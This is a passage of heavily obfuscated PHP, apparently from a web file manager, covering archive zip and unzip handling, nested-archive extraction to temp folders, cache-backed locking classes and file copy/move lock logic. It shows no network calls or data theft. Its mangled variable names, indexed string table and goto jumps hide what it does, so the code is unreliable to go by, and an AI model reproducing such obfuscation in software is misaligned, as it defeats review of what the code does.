$€ãùáÀğ->getType() == $°û™óÈª[106] ? $®‹³„§˜ : get_path_father($ù«ìë¬®->path); $ÆêŠ³ú = IO::getPathInner($ÆêŠ³ú); $ÆêŠ³ú = rtrim($ÆêŠ³ú, $°û™óÈª[8]) . $°û™óÈª[8]; mk_dir($ÆêŠ³ú); } else { $à©µšê = TEMP_FILES . $°û™óÈª[1373] . time() . rand_string(8) . $°û™óÈª[8]; mk_dir($à©µšê); file_put_contents($à©µšê . $°û™óÈª[1374], $°û™óÈª[12]); $ÆêŠ³ú = $à©µšê; } $”ß­ü‚Ë = IO::info($ÆêŠ³ú); if (!$”ß­ü‚Ë || !$”ß­ü‚Ë[$°û™óÈª[233]]) { show_json(LNG($°û™óÈª[1375]), !1); } $Â»ÀºÙ› = self::zipFileList($¶ ©Ü˜Ğ, $à©µšê); foreach ($Â»ÀºÙ› as $‚«ş²áÙ => $ÒÆ²áÚ) { $Â»ÀºÙ›[$‚«ş²áÙ] = self::iconvSystem($ÒÆ²áÚ); } $¼®¿Çä° = get_filename_auto($ÆêŠ³ú . $áÂéÛÖÇ, $°û™óÈª[12], $íªÀÊ©«); KodArchive::create(self::iconvSystem($¼®¿Çä°), $Â»ÀºÙ›); if (!IO::exist($¼®¿Çä°)) { if ($à©µšê) { del_dir($à©µšê); } write_log($°û™óÈª[1376] . $¼®¿Çä°, $°û™óÈª[388]); show_json(LNG($°û™óÈª[1377]), !1); } if (!$à©µšê) { return $¼®¿Çä°; } $ğÛ”ª…Ü = self::move($¼®¿Çä°, $®‹³„§˜, $íªÀÊ©«); if ($à©µšê) { del_dir($à©µšê); } if (!$¼®¿Çä°) { write_log($°û™óÈª[1378] . $¼®¿Çä° . $°û™óÈª[1379] . $®‹³„§˜, $°û™óÈª[388]); show_json(LNG($°û™óÈª[1377]), !1); } return $ğÛ”ª…Ü; } public static function unzip($­×Â±, $´³Äù“, $‘ï«éÌÛ = "\x2d\61", $ÔÔ¹¯¹ = "\x72\145\160\154\x61\143\x65") { $âø¢¯òŸ =& $_SERVER[µÅ˜º…æ]; $ÁñÙ¢¹û = parent::info($­×Â±); if (!$ÁñÙ¢¹û) { show_json(LNG($âø¢¯òŸ[1380]), !1); } $…¦©Æ¤´ = IO::infoFullSimple($´³Äù“); if (!$…¦©Æ¤´) { $´³Äù“ = IO::mkdir($´³Äù“); } if (isset($…¦©Æ¤´[$âø¢¯òŸ[191]]) && trim($…¦©Æ¤´[$âø¢¯òŸ[87]], $âø¢¯òŸ[8]) != trim($´³Äù“, $âø¢¯òŸ[8])) { $‰ë·µÌ¸ = KodIO::make($…¦©Æ¤´[$âø¢¯òŸ[190]]); $‘½Ä¨ßÀ = IO::fileNameAuto($‰ë·µÌ¸, $…¦©Æ¤´[$âø¢¯òŸ[32]], REPEAT_RENAME_FOLDER, !0); $´³Äù“ = IO::mkdir($‰ë·µÌ¸ . $‘½Ä¨ßÀ); } $‘ï«éÌÛ = $‘ï«éÌÛ && $‘ï«éÌÛ != $âø¢¯òŸ[1381] ? @json_decode($‘ï«éÌÛ, !0) : -1; $©©—ô°Î = self::unzipPart($­×Â±, $‘ï«éÌÛ); if (!$©©—ô°Î || !IO::exist($©©—ô°Î[$âø¢¯òŸ[230]])) { show_json(LNG($âø¢¯òŸ[105]), !1); } $ñõ ×Ğ× = $©©—ô°Î[$âø¢¯òŸ[1382]][count($©©—ô°Î[$âø¢¯òŸ[1382]]) - 1]; if ($ñõ ×Ğ×[$âø¢¯òŸ[1310]] == -1 || substr($ñõ ×Ğ×[$âø¢¯òŸ[32]], -1, 1) == $âø¢¯òŸ[8]) { $ò²Óıüõ = $©©—ô°Î[$âø¢¯òŸ[1383]] . rand_string(10) . $âø¢¯òŸ[8]; mk_dir($ò²Óıüõ); $áÌ¨°† = count($©©—ô°Î[$âø¢¯òŸ[1382]]) == 1 ? IO::ext($­×Â±) : get_path_ext($©©—ô°Î[$âø¢¯òŸ[230]]); $ò«¬à¡ = KodArchive::extract(self::iconvSystem($©©—ô°Î[$âø¢¯òŸ[230]]), $ò²Óıüõ, $ñõ ×Ğ×[$âø¢¯òŸ[1310]], $‘½Ä¨ßÀ, $áÌ¨°†); self::unzipErrorCheck($ò«¬à¡, array($âø¢¯òŸ[1384], $­×Â±, $áÌ¨°†, $´³Äù“, $©©—ô°Î)); Hook::trigger($âø¢¯òŸ[1385], $ò²Óıüõ); recursion_dir($ò²Óıüõ, $ıôáµ‰š, $×Ò–Ó±±, 0); $®Û®ÙŒú = array_merge($ıôáµ‰š, $×Ò–Ó±±); $ÊçıÀÆì = array(); foreach ($®Û®ÙŒú as $€ÉÂµø„) { $¼–ÈŒ¦¨ = IO::move(self::iconvApp($€ÉÂµø„), $´³Äù“, $ÔÔ¹¯¹); if ($¼–ÈŒ¦¨) { $ÊçıÀÆì[] = $¼–ÈŒ¦¨; } } del_dir($ò²Óıüõ); } else { $¼–ÈŒ¦¨ = IO::move($©©—ô°Î[$âø¢¯òŸ[230]], $´³Äù“, $ÔÔ¹¯¹, get_path_this($ñõ ×Ğ×[$âø¢¯òŸ[32]])); if ($¼–ÈŒ¦¨) { $ÊçıÀÆì[] = $¼–ÈŒ¦¨; } } return $ÊçıÀÆì ? $ÊçıÀÆì : !1; } public static function unzipList($í˜‹›î) { $¬Ô³ã™ =& $_SERVER[µÅ˜º…æ]; $Ò†È¥¡ø = isset($í˜‹›î[$¬Ô³ã™[1386]]) ? $í˜‹›î[$¬Ô³ã™[1386]] : !1; $É„ò…âË = isset($í˜‹›î[$¬Ô³ã™[1310]]) ? @json_decode($í˜‹›î[$¬Ô³ã™[1310]], !0) : -1; $÷ñºÆ× = self::unzipPart($í˜‹›î[$¬Ô³ã™[87]], $É„ò…âË); if (!$÷ñºÆ× || !IO::exist($÷ñºÆ×[$¬Ô³ã™[230]])) { show_json(LNG($¬Ô³ã™[105]), !1); } $Õàòâñ  = $÷ñºÆ×[$¬Ô³ã™[1382]][count($÷ñºÆ×[$¬Ô³ã™[1382]]) - 1]; $åùİ‰“ = in_array(IO::ext($÷ñºÆ×[$¬Ô³ã™[230]]), array($¬Ô³ã™[388], $¬Ô³ã™[1387], $¬Ô³ã™[1388], $¬Ô³ã™[1389], $¬Ô³ã™[1390], $¬Ô³ã™[1391])); if (!$Ò†È¥¡ø && ($Õàòâñ [$¬Ô³ã™[1310]] == -1 || $åùİ‰“)) { $”Ç›ö¸ü = $÷ñºÆ×[$¬Ô³ã™[1383]] . get_path_this($÷ñºÆ×[$¬Ô³ã™[230]]) . $¬Ô³ã™[959]; if (!IO::exist($”Ç›ö¸ü)) { $¤¢¦½ö¢ = $Õàòâñ [$¬Ô³ã™[1310]] == -1 ? get_path_ext(IO::pathThis($í˜‹›î[$¬Ô³ã™[87]])) : get_path_ext($÷ñºÆ×[$¬Ô³ã™[230]]); $ˆûÛ€úá = KodArchive::listContent(self::iconvSystem($÷ñºÆ×[$¬Ô³ã™[230]]), !0, $¤¢¦½ö¢); self::unzipErrorCheck($ˆûÛ€úá, array($¬Ô³ã™[1392], $í˜‹›î, $÷ñºÆ×)); @file_put_contents($”Ç›ö¸ü, json_encode($ˆûÛ€úá[$¬Ô³ã™[1393]])); } return @json_decode(IO::getContent($”Ç›ö¸ü), !0); } IO::fileOut($÷ñºÆ×[$¬Ô³ã™[230]], $Ò†È¥¡ø, get_path_this($Õàòâñ [$¬Ô³ã™[32]])); die; } private static function zipFileList($…¾Šà¢—, $¬îŸÄ¥ = false) { $¢—õ³È‚ =& $_SERVER[µÅ˜º…æ]; $¡ğ·Ë¼â = array(); foreach ($…¾Šà¢— as $ŠÕÛÌ©¬) { $½ä¿É‘ñ = $ŠÕÛÌ©¬[$¢—õ³È‚[87]]; if ($¬îŸÄ¥) { $½ä¿É‘ñ = self::copy($ŠÕÛÌ©¬[$¢—õ³È‚[87]], $¬îŸÄ¥, $¢—õ³È‚[926]); } else { $ÓƒÙ«ÎŒ = self::init($ŠÕÛÌ©¬[$¢—õ³È‚[87]]); if ($ÓƒÙ«ÎŒ->getType() == $¢—õ³È‚[106]) { $½ä¿É‘ñ = $ÓƒÙ«ÎŒ->path; } } if ($½ä¿É‘ñ && self::local()->exist($½ä¿É‘ñ)) { $¡ğ·Ë¼â[$ŠÕÛÌ©¬[$¢—õ³È‚[87]]] = $½ä¿É‘ñ; } } if (!empty($¡ğ·Ë¼â)) { return array_values($¡ğ·Ë¼â); } show_json(LNG($¢—õ³È‚[1352]), !1); } private static function localFilePath($ñŸü‘ç) { $¹‰¬å…  =& $_SERVER[µÅ˜º…æ]; $·ÚäÔ˜ = KodIO::parse($ñŸü‘ç); if ($·ÚäÔ˜[$¹‰¬å… [33]] == KodIO::KOD_SOURCE) { $øâ»¾Ïª = Model($¹‰¬å… [932])->fileInfoGet(KodIO::sourceID($ñŸü‘ç)); if (!$øâ»¾Ïª[$¹‰¬å… [87]]) { show_json($¹‰¬å… [1394], !1); } $ñŸü‘ç = $øâ»¾Ïª[$¹‰¬å… [87]]; } $ÂÙ¨“ı = self::init($ñŸü‘ç); if ($ÂÙ¨“ı->pathParse[$¹‰¬å… [1338]]) { $ñŸü‘ç = $ÂÙ¨“ı->pathParse[$¹‰¬å… [1338]]; $ÂÙ¨“ı = self::init($ñŸü‘ç); } $ş±Š´ŠÔ = $ÂÙ¨“ı->getType(); if ($ş±Š´ŠÔ == $¹‰¬å… [106] || $ş±Š´ŠÔ == $¹‰¬å… [1395]) { if (!$ÂÙ¨“ı->exist($ÂÙ¨“ı->path)) { show_json(LNG($¹‰¬å… [105]), !1); } return $ÂÙ¨“ı->path; } return !1; } public static function unzipPart($ÄÃ€Â‰Æ, $ì©°ü‘ = -1) { $‹¦ÌØşü =& $_SERVER[µÅ˜º…æ]; $ÎÙ›‡éñ = IO::pathThis($ÄÃ€Â‰Æ); if (!$ì©°ü‘ || $ì©°ü‘ == -1) { $“Ô‰Ò¤† = array(array($‹¦ÌØşü[32] => $ÎÙ›‡éñ, $‹¦ÌØşü[1310] => -1)); $“Ô‰Ò¤†[0][$‹¦ÌØşü[1396]] = $“Ô‰Ò¤†[0][$‹¦ÌØşü[32]]; } else { if (is_array($ì©°ü‘)) { $“Ô‰Ò¤† = $ì©°ü‘; $¶Ã¦çşğ = count($“Ô‰Ò¤†) - 1; for ($úÚ¿ğ¿¢ = 0; $úÚ¿ğ¿¢ <= $¶Ã¦çşğ; $úÚ¿ğ¿¢++) { $â“ñÚ†í = $“Ô‰Ò¤†[$úÚ¿ğ¿¢]; $ÁÔí¬‰ş = get_path_this($â“ñÚ†í[$‹¦ÌØşü[32]]) . (checkExtSafe($â“ñÚ†í[$‹¦ÌØşü[32]]) ? $‹¦ÌØşü[12] : $‹¦ÌØşü[1397]); $“Ô‰Ò¤†[$úÚ¿ğ¿¢][$‹¦ÌØşü[1396]] = $‹¦ÌØşü[1398] . intval($â“ñÚ†í[$‹¦ÌØşü[1310]]) . $‹¦ÌØşü[476] . $ÁÔí¬‰ş; if ($úÚ¿ğ¿¢ == 0) { continue; } $“Ô‰Ò¤†[$úÚ¿ğ¿¢][$‹¦ÌØşü[1396]] = $“Ô‰Ò¤†[$úÚ¿ğ¿¢ - 1][$‹¦ÌØşü[1396]] . $‹¦ÌØşü[1399] . $“Ô‰Ò¤†[$úÚ¿ğ¿¢][$‹¦ÌØşü[1396]]; } } } if (!is_array($“Ô‰Ò¤†) || count($“Ô‰Ò¤†) == 0) { return !1; } $·¶İ˜¨œ = $“Ô‰Ò¤†[count($“Ô‰Ò¤†) - 1]; if (!IO::exist($ÄÃ€Â‰Æ)) { return !1; } $îÁ´½Üó = TEMP_FILES . $‹¦ÌØşü[1400] . kodIO::hashPathSafe($ÄÃ€Â‰Æ) . $‹¦ÌØşü[8]; $Á¦£Óè¹ = $îÁ´½Üó . $·¶İ˜¨œ[$‹¦ÌØşü[1396]]; mk_dir($îÁ´½Üó); file_put_contents(TEMP_FILES . $‹¦ÌØşü[1374], $‹¦ÌØşü[12]); if (IO::exist($Á¦£Óè¹)) { return array($‹¦ÌØşü[230] => $Á¦£Óè¹, $‹¦ÌØşü[1382] => $“Ô‰Ò¤†, $‹¦ÌØşü[1383] => $îÁ´½Üó); } $Âº­ñô› = self::localFilePath($ÄÃ€Â‰Æ); if (!$Âº­ñô›) { $Âº­ñô› = $îÁ´½Üó . $‹¦ÌØşü[1401]; if (!IO::exist($Âº­ñô›)) { self::copy($ÄÃ€Â‰Æ, $îÁ´½Üó, !1, get_path_this($Âº­ñô›)); } } if (!$Âº­ñô› || !IO::exist($Âº­ñô›)) { return !1; } if ($·¶İ˜¨œ[$‹¦ÌØşü[1310]] == -1) { return array($‹¦ÌØşü[230] => $Âº­ñô›, $‹¦ÌØşü[1382] => $“Ô‰Ò¤†, $‹¦ÌØşü[1383] => $îÁ´½Üó); } $‘Ô“á¶È = $Âº­ñô›; foreach ($“Ô‰Ò¤† as $úÚ¿ğ¿¢ => $â“ñÚ†í) { if (!$â“ñÚ†í || $â“ñÚ†í[$‹¦ÌØşü[1310]] == $‹¦ÌØşü[1381]) { break; } if (substr($â“ñÚ†í[$‹¦ÌØşü[32]], -1, 1) == $‹¦ÌØşü[8]) { break; } $´ÒÃ‹İ‚ = in_array(get_path_ext($â“ñÚ†í[$‹¦ÌØşü[1396]]), array($‹¦ÌØşü[388], $‹¦ÌØşü[1387], $‹¦ÌØşü[1388], $‹¦ÌØşü[1389], $‹¦ÌØşü[1390], $‹¦ÌØşü[1391])); $œ•ş£ôõ = $úÚ¿ğ¿¢ == count($“Ô‰Ò¤†) - 1 && $´ÒÃ‹İ‚; $³ÕÖº£Â = $îÁ´½Üó . $â“ñÚ†í[$‹¦ÌØşü[1396]]; $—¶†¨Ù = $îÁ´½Üó . get_path_this($â“ñÚ†í[$‹¦ÌØşü[32]]); if (IO::exist($³ÕÖº£Â)) { $‘Ô“á¶È = $³ÕÖº£Â; continue; } $ÍçÈ™ğî = $úÚ¿ğ¿¢ == 0 ? get_path_ext($ÎÙ›‡éñ) : get_path_ext($‘Ô“á¶È); $¼Ù¯äõ’ = KodArchive::extract(self::iconvSystem($‘Ô“á¶È), $îÁ´½Üó, $â“ñÚ†í[$‹¦ÌØşü[1310]], $¶Â ÆËì, $ÍçÈ™ğî); self::unzipErrorCheck($¼Ù¯äõ’, array($‹¦ÌØşü[1402], $ÄÃ€Â‰Æ, $“Ô‰Ò¤†, $â“ñÚ†í, $³ÕÖº£Â)); if (IO::exist($—¶†¨Ù)) { IO::rename($—¶†¨Ù, get_path_this($³ÕÖº£Â)); } $‘Ô“á¶È = $³ÕÖº£Â; } $Á¦£Óè¹ = $‘Ô“á¶È; return array($‹¦ÌØşü[230] => $‘Ô“á¶È, $‹¦ÌØşü[1382] => $“Ô‰Ò¤†, $‹¦ÌØşü[1383] => $îÁ´½Üó); } private static function unzipErrorCheck($ç„Œ¢õõ, $œ±ñûº­ = false) { $ÆÒƒéÜı =& $_SERVER[µÅ˜º…æ]; if ($ç„Œ¢õõ[$ÆÒƒéÜı[1403]]) { return !0; } write_log(array($ÆÒƒéÜı[1404], $ç„Œ¢õõ, $œ±ñûº­), $ÆÒƒéÜı[1405]); $ªÚ Ç’Ê = is_array($ç„Œ¢õõ[$ÆÒƒéÜı[1393]]) ? json_encode($ç„Œ¢õõ[$ÆÒƒéÜı[1393]]) : $ç„Œ¢õõ[$ÆÒƒéÜı[1393]]; show_json($ÆÒƒéÜı[1406] . $ªÚ Ç’Ê, !1); die; } } goto e£ëï‰­ö; D×Ú²²ƒùƒ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¬ùÒ¸ … =& $_SERVER[µÅ˜º…æ]; if (self::$handle) { return self::$handle; } $úµ»«’î = $GLOBALS[$¬ùÒ¸ …[6]][$¬ùÒ¸ …[424]]; self::$timeout = $úµ»«’î[$¬ùÒ¸ …[996]] ? $úµ»«’î[$¬ùÒ¸ …[996]] : 10; $³ğ„½”ã = _get($GLOBALS[$¬ùÒ¸ …[6]], $¬ùÒ¸ …[997]); $ÃÊŞÅİ = $úµ»«’î[$¬ùÒ¸ …[979]] ? $úµ»«’î[$¬ùÒ¸ …[979]] : $¬ùÒ¸ …[230]; if ($ÃÊŞÅİ == $¬ùÒ¸ …[21] && $³ğ„½”ã == $¬ùÒ¸ …[13]) { $ÃÊŞÅİ = $¬ùÒ¸ …[230]; } switch ($ÃÊŞÅİ) { case $¬ùÒ¸ …[982]: self::$handle = new CacheLockRedis(); break; case $¬ùÒ¸ …[983]: self::$handle = new CacheLockMemcached(); break; case $¬ùÒ¸ …[21]: self::$handle = new CacheLockDatabase(); break; case $¬ùÒ¸ …[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¬ùÒ¸ …[998], $¬ùÒ¸ …[999]); } return self::$handle; } private static function key($åìŠ¯„¦) { return $_SERVER[µÅ˜º…æ][1000] . Cache::key($åìŠ¯„¦); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($™×Ûı¯è = '') { self::$errorMsg = $™×Ûı¯è; } public static function lockGlobal($ ííÁòæ, $İùİ…È) { return self::lock($ ííÁòæ, $İùİ…È, !0); } public static function lock($óˆÄƒÛ¬, $³øóœ¼ü = false, $†Ê·©Œú = false) { $ÅÆ‚Ä¯à =& $_SERVER[µÅ˜º…æ]; $¸•ìÇ…£ = self::init(); $¶‚Ù·ë = self::key($óˆÄƒÛ¬); $³øóœ¼ü = $³øóœ¼ü ? $³øóœ¼ü : self::$timeout; $èü¡’Èï = timeFloat(); if (_get($GLOBALS, $ÅÆ‚Ä¯à[1001], !1)) { if (!$¸•ìÇ…£->lock($¶‚Ù·ë, 0.2)) { die; } return !0; } $åŞîÛû = $¸•ìÇ…£->lock($¶‚Ù·ë, $³øóœ¼ü); $¾à‚óí† = timeFloat(); if (!$åŞîÛû) { $¦‡ÈñÃ = "\x6c\x6f\x63\x6b\x20\x65\x72\x72\157\162\73\153\145\x79\x3d{$óˆÄƒÛ¬}\x3b\x74\x69\x6d\145\x3d{$³øóœ¼ü}\73" . self::$errorMsg . $ÅÆ‚Ä¯à[74] . get_caller_msg(); $‡¢˜²Ñ = LNG($ÅÆ‚Ä¯à[1002]) . "\x28{$³øóœ¼ü}\163\51\x2e" . LNG($ÅÆ‚Ä¯à[1003]); $‡¢˜²Ñ .= $ÅÆ‚Ä¯à[1004]; if (is_string(self::$errorMsg) && self::$errorMsg) { $‡¢˜²Ñ = $‡¢˜²Ñ . $ÅÆ‚Ä¯à[1005] . self::$errorMsg; } write_log($ÅÆ‚Ä¯à[1006] . sprintf($ÅÆ‚Ä¯à[1007], timeFloat() - $èü¡’Èï) . $ÅÆ‚Ä¯à[1008] . $¦‡ÈñÃ . $ÅÆ‚Ä¯à[1009] . json_encode(error_get_last()), $ÅÆ‚Ä¯à[999]); show_json($‡¢˜²Ñ, !1); } if (!$†Ê·©Œú) { self::$lockItem[$¶‚Ù·ë] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $à´Ï¢úË = number_format(timeFloat() - $¾à‚óí†, 3); write_log($ÅÆ‚Ä¯à[1010] . $óˆÄƒÛ¬ . $ÅÆ‚Ä¯à[1011] . $à´Ï¢úË, $ÅÆ‚Ä¯à[999]); } return $åŞîÛû; } public static function lockGet($‹’ƒË–Â) { $± É¨¯¥ = self::key($‹’ƒË–Â); if (self::$lockItem[$± É¨¯¥]) { return self::$lockItem[$± É¨¯¥]; } return self::init()->lockGet($± É¨¯¥); } public static function unlock($øÚ®ìÀ¿) { $ÖŒ§Ù…« =& $_SERVER[µÅ˜º…æ]; $Ì˜óùóß = self::key($øÚ®ìÀ¿); self::$lockItem[$Ì˜óùóß] = null; self::init()->unlock($Ì˜óùóß); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÖŒ§Ù…«[1012] . $øÚ®ìÀ¿, $ÖŒ§Ù…«[999]); } return; } public static function unlockRuntime() { $©ÎäõÑİ =& $_SERVER[µÅ˜º…æ]; $ÀØß²æÍ = self::init(); $¢¾™ôé = !1; foreach (self::$lockItem as $é¥“Èã£ => $óìà”şÔ) { if (!$óìà”şÔ) { continue; } $ÀØß²æÍ->unlock($é¥“Èã£); if (!$¢¾™ôé) { $¢¾™ôé = !0; write_log($©ÎäõÑİ[1013] . $é¥“Èã£ . $©ÎäõÑİ[74] . get_caller_msg(), $©ÎäõÑİ[999]); continue; } write_log($©ÎäõÑİ[1013] . $é¥“Èã£, $©ÎäõÑİ[999]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ôâ¾¯„¹ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($©ÎäõÑİ[1014] . $ôâ¾¯„¹ . $©ÎäõÑİ[1015] . ACTION, $©ÎäõÑİ[999]); } } public static function fileLock($ç–Üƒ¥®) { $ÈĞ¢›ºğ =& $_SERVER[µÅ˜º…æ]; if (!$GLOBALS[$ÈĞ¢›ºğ[1016]]) { $GLOBALS[$ÈĞ¢›ºğ[1016]] = array(); } $GLOBALS[$ÈĞ¢›ºğ[1016]][$ç–Üƒ¥®] = !1; $éş…‚ÔÜ = fopen(DATA_PATH . $ç–Üƒ¥® . $ÈĞ¢›ºğ[1017], $ÈĞ¢›ºğ[1018]); if (!$éş…‚ÔÜ) { return !1; } $GLOBALS[$ÈĞ¢›ºğ[1016]][$ç–Üƒ¥®] = $éş…‚ÔÜ; if (flock($éş…‚ÔÜ, LOCK_EX)) { return !0; } self::unlock($ç–Üƒ¥®); show_json($ÈĞ¢›ºğ[1019], !1); return !1; } public static function fileUnlock($¨Ùˆ•î×) { $ûÒğÖÚ =& $_SERVER[µÅ˜º…æ]; $ş¯ßâö = $GLOBALS[$ûÒğÖÚ[1016]][$¨Ùˆ•î×]; if (!$ş¯ßâö) { return; } $GLOBALS[$ûÒğÖÚ[1016]][$¨Ùˆ•î×] = !1; flock($ş¯ßâö, LOCK_UN); fclose($ş¯ßâö); } public static function fileUnlockAll() { $¹ˆ±ùñİ =& $_SERVER[µÅ˜º…æ]; if (!isset($GLOBALS[$¹ˆ±ùñİ[1016]]) || !$GLOBALS[$¹ˆ±ùñİ[1016]]) { return; } foreach ($GLOBALS[$¹ˆ±ùñİ[1016]] as $šÂè‚ôõ => $±ÉÎ¯àÂ) { if (!$±ÉÎ¯àÂ) { continue; } $GLOBALS[$¹ˆ±ùñİ[1016]][$šÂè‚ôõ] = !1; flock($±ÉÎ¯àÂ, LOCK_UN); fclose($±ÉÎ¯àÂ); } $GLOBALS[$¹ˆ±ùñİ[1016]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÒÜÚ¬Óæ =& $_SERVER[µÅ˜º…æ]; $ğÅŸÛ·ò = $GLOBALS[$ÒÜÚ¬Óæ[6]][$ÒÜÚ¬Óæ[424]]; self::$cachePath = $ğÅŸÛ·ò[$ÒÜÚ¬Óæ[230]][$ÒÜÚ¬Óæ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÛüîÒÎµ, $›î”´• = 0) { $ûŠè¶²° =& $_SERVER[µÅ˜º…æ]; $£ªñç§¿ = microtime(!0); $»Ä²œÕï = $£ªñç§¿ + $›î”´• + 0.0001; $¶ë¬ãŠ = rtrim(self::$cachePath, $ûŠè¶²°[8]) . $ûŠè¶²°[1020] . md5($ÛüîÒÎµ) . $ûŠè¶²°[1017]; if (file_exists($¶ë¬ãŠ) && filemtime($¶ë¬ãŠ) && filemtime($¶ë¬ãŠ) < time() - 10) { @unlink($¶ë¬ãŠ); } do { if (file_exists($¶ë¬ãŠ)) { cacheLockWait(); continue; } $‘öâûò = fopen($¶ë¬ãŠ, $ûŠè¶²°[1021]); if (!$‘öâûò) { return !1; } $£Œ–ÏÌ = flock($‘öâûò, LOCK_EX | LOCK_NB); self::$caches[$ÛüîÒÎµ] = array($ûŠè¶²°[1022] => $‘öâûò, $ûŠè¶²°[230] => $¶ë¬ãŠ); fwrite($‘öâûò, $»Ä²œÕï); clearstatcache(); if ($‘öâûò && $£Œ–ÏÌ) { return !0; } cacheLockWait(); } while (microtime(!0) < $»Ä²œÕï); $this->unlock($ÛüîÒÎµ); return !1; } public function lockGet($›ş†¿¶£) { $…ú’°åï =& $_SERVER[µÅ˜º…æ]; $á˜áÁî = rtrim(self::$cachePath, $…ú’°åï[8]) . $…ú’°åï[1020] . md5($›ş†¿¶£) . $…ú’°åï[1017]; return file_exists($á˜áÁî); } public function unlock($Ç†øû®š) { $Ğòò¹µâ =& $_SERVER[µÅ˜º…æ]; $ÕõïìÃ¤ = self::$caches[$Ç†øû®š]; if (!$ÕõïìÃ¤) { return; } @flock($ÕõïìÃ¤[$Ğòò¹µâ[1022]], LOCK_UN); @fclose($ÕõïìÃ¤[$Ğòò¹µâ[1022]]); @unlink($ÕõïìÃ¤[$Ğòò¹µâ[230]]); unset(self::$caches[$Ç†øû®š]); } } goto FãÙòŠ°ÇŸ; F‡‚ùÓğÖÃ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($’Ä€—ƒˆ) { $ï·£Éï¡ =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ï·£Éï¡[641], $’Ä€—ƒˆ); $ã«¸Õİä = 1; $this->_lockEvent($’Ä€—ƒˆ, array($ï·£Éï¡[642], $ï·£Éï¡[643]), $ã«¸Õİä); $this->_lockParent($’Ä€—ƒˆ, array($ï·£Éï¡[643]), $ã«¸Õİä); $this->_lockEvent($’Ä€—ƒˆ, array($ï·£Éï¡[644], $ï·£Éï¡[645]), $ã«¸Õİä); $this->_lockCheckEnd($ï·£Éï¡[641], $’Ä€—ƒˆ); } public function lockCopyEnd($Ÿ¨–†–Ê) { $©Ü—„÷İ =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $µ¿óû¬Æ = 0; $this->_lockEvent($Ÿ¨–†–Ê, array($©Ü—„÷İ[642], $©Ü—„÷İ[643]), $µ¿óû¬Æ); $this->_lockParent($Ÿ¨–†–Ê, array($©Ü—„÷İ[643]), $µ¿óû¬Æ); $this->_lockEvent($Ÿ¨–†–Ê, array($©Ü—„÷İ[644], $©Ü—„÷İ[645]), $µ¿óû¬Æ); } public function lockWriteStart($›—Îıˆ¥, $ˆÑàŸ° = '') { $çªÕÅúÌ =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($çªÕÅúÌ[642], $›—Îıˆ¥); $Äˆìæåù = 1; $this->_lockKey($çªÕÅúÌ[646] . $›—Îıˆ¥ . $çªÕÅúÌ[10] . $ˆÑàŸ°, $Äˆìæåù); $this->_lockEvent($›—Îıˆ¥, array($çªÕÅúÌ[641], $çªÕÅúÌ[643]), $Äˆìæåù); $this->_lockParent($›—Îıˆ¥, array($çªÕÅúÌ[641], $çªÕÅúÌ[643]), $Äˆìæåù); $this->_lockCheckEnd($çªÕÅúÌ[642], $›—Îıˆ¥); } public function lockWriteEnd($Š°¬„ÊÍ, $ñÑĞ©ïı = '') { $ÇıôÓ¡ =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $¼†­áğˆ = 0; $this->_lockKey($ÇıôÓ¡[646] . $Š°¬„ÊÍ . $ÇıôÓ¡[10] . $ñÑĞ©ïı, $¼†­áğˆ); $this->_lockEvent($Š°¬„ÊÍ, array($ÇıôÓ¡[641], $ÇıôÓ¡[643]), $¼†­áğˆ); $this->_lockParent($Š°¬„ÊÍ, array($ÇıôÓ¡[641], $ÇıôÓ¡[643]), $¼†­áğˆ); } public function lockMoveStart($ÜØÇ·) { $”­€Òê =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($”­€Òê[643], $ÜØÇ·); $ˆúÚ³Ñ¿ = 1; $this->_lockKey($”­€Òê[647] . $ÜØÇ·, $ˆúÚ³Ñ¿); $this->_lockEvent($ÜØÇ·, array($”­€Òê[641], $”­€Òê[642]), $ˆúÚ³Ñ¿); $this->_lockParent($ÜØÇ·, array($”­€Òê[641], $”­€Òê[643]), $ˆúÚ³Ñ¿); $this->_lockEvent($ÜØÇ·, array($”­€Òê[648], $”­€Òê[644], $”­€Òê[645]), $ˆúÚ³Ñ¿); $this->_lockCheckEnd($”­€Òê[643], $ÜØÇ·); } public function lockMoveEnd($×óŒÕ¤) { $…¸„Ş—Ü =& $_SERVER[µÅ˜º…æ]; if (!$this->allowLock()) { return; } $‹İÖÒª = 0; $this->_lockKey($…¸„Ş—Ü[647] . $×óŒÕ¤, $‹İÖÒª); $this->_lockEvent($×óŒÕ¤, array($…¸„Ş—Ü[641], $…¸„Ş—Ü[642]), $‹İÖÒª); $this->_lockParent($×óŒÕ¤, array($…¸„Ş—Ü[641], $…¸„Ş—Ü[643]), $‹İÖÒª); $this->_lockEvent($×óŒÕ¤, array($…¸„Ş—Ü[648], $…¸„Ş—Ü[644], $…¸„Ş—Ü[645]), $‹İÖÒª); } private function _lockCheck($°³¸‹¦‹, $ğŠ³©Ë) { $Ë…øòĞÃ =& $_SERVER[µÅ˜º…æ]; $ïƒã±é = $this->sourceInfo($ğŠ³©Ë); $îëûâ®Ò = $°³¸‹¦‹ . $Ë…øòĞÃ[10] . $ğŠ³©Ë; $this->_lockTimeStart[$îëûâ®Ò] = timeFloat(); if (!is_array($ïƒã±é)) { return; } $ÌıÍ˜Å“ = LNG($Ë…øòĞÃ[649]); CacheLock::setErrorMsg($Ë…øòĞÃ[173] . htmlspecialchars($ïƒã±é[$Ë…øòĞÃ[32]]) . $Ë…øòĞÃ[175] . 